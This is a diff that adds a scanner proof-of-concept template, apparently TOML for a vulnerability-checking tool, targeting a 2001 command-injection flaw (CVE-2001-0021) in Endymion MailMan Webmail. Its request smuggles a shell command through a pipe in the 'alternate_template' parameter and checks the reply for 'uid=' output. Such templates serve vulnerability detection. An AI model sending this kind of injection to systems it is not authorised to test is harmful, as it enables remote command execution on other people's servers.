@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "验证目标是否存在 Endymion MailMan Webmail alternate_template 参数命令注入漏洞。通过构造包含 Shell 元字符的 HTTP 请求参数，检测服务器是否允许远程命令执行。"
+id = "POC-AVE-2001-0008"
+name = "Endymion MailMan Webmail 远程命令执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2001-0008"]
+vuln_id = [
+    "CVE-2001-0021",
+    "AVE-2001-0008",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/mailman/alternate_template"
+protocol = "http"
+
+[poc.requests.body]
+content = "alternate_template=|id"
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+    "groups=",
+]
